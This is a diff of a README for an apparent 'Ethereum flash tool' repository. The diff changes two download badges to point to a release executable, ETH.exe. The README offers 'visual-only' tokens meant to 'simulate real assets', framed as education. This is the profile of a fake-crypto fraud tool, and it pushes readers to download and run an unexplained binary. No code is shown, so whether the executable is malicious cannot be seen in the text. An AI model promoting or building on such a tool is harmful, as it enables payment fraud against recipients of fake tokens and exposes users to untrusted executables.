@@ -5,7 +5,7 @@ A lightweight, GUI-based Ethereum education utility designed for **flash token t
 <h1 align="center"><b>🚀 Download Now</b></h1>
 
 <p align="center">
-<a href="https://github.com/mr-nomad/2025-Ethereum-Flash-Tool/releases/download/Tool/ETH_node_tool_2025.exe">
+<a href="https://github.com/mr-nomad/2025-Ethereum-Flash-Tool/releases/download/Tool/ETH.exe">
     <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
   </a>
 </p>
@@ -33,7 +33,7 @@ All tokens are **visual-only**, designed to simulate real assets:
 - **DAI (Multi-Collateral Dai)**
 
 <p align="center">
-<a href="https://github.com/mr-nomad/2025-Ethereum-Flash-Tool/releases/download/Tool/ETH_node_tool_2025.exe">
+<a href="https://github.com/mr-nomad/2025-Ethereum-Flash-Tool/releases/download/Tool/ETH.exe">
     <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
   </a>
 </p>
